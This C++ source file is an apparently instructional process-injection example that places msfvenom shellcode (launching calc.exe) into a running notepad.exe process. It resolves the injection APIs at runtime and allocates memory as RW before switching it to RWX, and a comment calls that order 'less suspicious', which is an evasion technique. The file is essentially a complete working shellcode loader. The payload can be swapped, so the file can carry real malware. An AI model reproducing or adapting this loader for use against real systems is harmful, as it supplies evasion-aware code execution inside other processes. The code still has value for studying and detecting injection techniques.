/*
* Process injection example 4: injecting calc.exe msfvenom shellcode into a remote process using dynamic function resolution
* shellcode: msfvenom -p windows/x64/exec CMD=calc.exe -f C EXITFUNC=thread
* compile: cl.exe injection-example-4.cpp  /D"_UNICODE" /D"UNICODE" /W0
*/
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
typedef LPVOID(WINAPI* P_VirtualAllocEx)(
	HANDLE pHandle,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
);

// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex
typedef BOOL(WINAPI* P_VirtualProtectEx) (
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flNewProtect,
	PDWORD lpflOldProtect
);

// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
typedef BOOL(WINAPI* P_WriteProcessMemory)(
	HANDLE  hProcess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T  *lpNumberOfBytesWritten
);

// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
typedef HANDLE(WINAPI* P_CreateRemoteThread) (
	HANDLE                 hProcess,
	LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	SIZE_T                 dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID                 lpParameter,
	DWORD                  dwCreationFlags,
	LPDWORD                lpThreadId	
);

// Adapted from Pavel Yosifovich's Enumerate Processes (part 1): https://www.youtube.com/watch?v=IZULG6I4z5U
DWORD FindpidByName(LPCWSTR processName) {
    DWORD foundpid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return foundpid;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(processName, pe.szExeFile) == 0) {
                foundpid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return foundpid;
}

int main() {
        
    unsigned char buf[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	  P_VirtualAllocEx myVirtualAllocEx = nullptr;
	  P_WriteProcessMemory myWriteProcessMemory = nullptr;
	  P_VirtualProtectEx myVirtualProtectEx = nullptr;
	  P_CreateRemoteThread myCreateRemoteThread = nullptr;

    DWORD pid = 0;
    const wchar_t* processName = L"notepad.exe";

    pid = FindpidByName(processName);
    if (pid == 0) {
        printf("[ERROR] Failed to obtain process ID!\n");
        return -1;
    }

    printf("[*] Running PI with target PID: %u\n", pid);

    // Open a handle to the current process, this must be passed to VirtualAllocEx
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
    if (pHandle == NULL) {
        printf("Failed to acquire process handle!\n");
        return -1;
    }

    // Obtain a handle to the kernel32.dll module, this will be passed to GetProcAddress
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL) {
        printf("[ERROR] Failed to get handle to kernel32.dll. Error: %u\n", GetLastError());
        return -1;
    }
	
	  // Use GetProcAddress to get the address of the VirtualAllocEx function
	  myVirtualAllocEx = (P_VirtualAllocEx)GetProcAddress(hKernel32, "VirtualAllocEx");
	  if (myVirtualAllocEx == nullptr) {
		    printf("[ERROR] Failed to resolve VirtualAllocEx. Error: %u\n", GetLastError());
		    FreeLibrary(hKernel32); // Clean up the module handle
		    return -1;
	  }

    // Use GetProcAddress to get the address of the WriteProcessMemory function
    myWriteProcessMemory = (P_WriteProcessMemory)GetProcAddress(hKernel32, "WriteProcessMemory");
    if (myWriteProcessMemory == nullptr) {
      printf("[ERROR] Failed to resolve WriteProcessMemory. Error: %u\n", GetLastError());
      FreeLibrary(hKernel32); // Clean up the module handle
      return -1;
    }

    // Use GetProcAddress to get the address of the VirtualProtectEx function
    myVirtualProtectEx = (P_VirtualProtectEx)GetProcAddress(hKernel32, "VirtualProtectEx");
    if (myVirtualProtectEx == nullptr) {
        printf("[ERROR] Failed to resolve VirtualProtectEx. Error: %u\n", GetLastError());
        FreeLibrary(hKernel32); // Clean up the module handle
        return -1;
    }

	  // Use GetProcAddress to get the address of the CreateRemoteThread function
	  myCreateRemoteThread = (P_CreateRemoteThread)GetProcAddress(hKernel32, "CreateRemoteThread");
	  if (myCreateRemoteThread == nullptr) {
		    printf("[ERROR] Failed to resolve CreateRemoteThread. Error: %u\n", GetLastError());
		    FreeLibrary(hKernel32); // Clean up the module handle
		    return -1;
	  }	

    printf("[*] Successfully opened handle to PID: %u\n", pid);

    // Allocate a block of memory that can store our shellcode, RW memory protection is slightly less suspicious
    LPVOID bufferAddress = myVirtualAllocEx(pHandle, NULL, sizeof buf, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if (bufferAddress == NULL) {
        printf("[ERROR] Failed to allocate memory within the process (PID: %u)! Error: %lu\n", pid, GetLastError());
        return -1;
    }

    printf("[*] Memory allocated at: 0x%016llx\n", bufferAddress);

    // Write the shellcode to the block of memory that we allocated with VirtualAllocEx
    BOOL writeShellcode = myWriteProcessMemory(pHandle, bufferAddress, buf, sizeof buf, NULL);
    if (writeShellcode == false) {
        printf("[ERROR] Failed to write shellcode! Using addresss: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
        VirtualFree(bufferAddress, 0, MEM_RELEASE);
        return -1;
    }

    // Update the memory protection value from RW to RWX
    DWORD lpOldProtect = NULL;
    BOOL updateMemoryProtection = myVirtualProtectEx(pHandle, bufferAddress, sizeof buf, PAGE_EXECUTE_READWRITE, &lpOldProtect);
    if (updateMemoryProtection == false) {
        printf("[ERROR] Failed to update memory protection (updating from RW to RWX)! Using addresss: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
        VirtualFree(bufferAddress, 0, MEM_RELEASE);
        return -1;
    }

    // Create a new thread using the shellcode buffer address as the starting point
    HANDLE tHandle = myCreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)bufferAddress, NULL, 0, NULL);
    if (tHandle == NULL) {
        printf("[ERROR] Failed to create thread within the process (PID: %u)! Error: %lu\n", pid, GetLastError());
        VirtualFree(bufferAddress, 0, MEM_RELEASE);
        return -1;
    }

    // Wait for the thread to return - not required, but it definitely makes the demonstration much cleaner
    printf("[*] Waiting for the thread to return...\n");
    WaitForSingleObject(tHandle, INFINITE);

    // Update the memory protection value from RWX to RW
    updateMemoryProtection = myVirtualProtectEx(pHandle, bufferAddress, sizeof buf, PAGE_READWRITE, &lpOldProtect);
    if (updateMemoryProtection == false) {
        printf("[ERROR] Failed to update memory protection (toggling back to RW)! Using addresss: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
        VirtualFree(bufferAddress, 0, MEM_RELEASE);
        return -1;
    }

    // Clean up open handles and free the shellcode buffer memory
    CloseHandle(pHandle);
    CloseHandle(tHandle);
    VirtualFree(bufferAddress, 0, MEM_RELEASE);
	  FreeLibrary(hKernel32); // Clean up the module handle

    printf("[*] Process injection complete.\n");

    return 0;
}
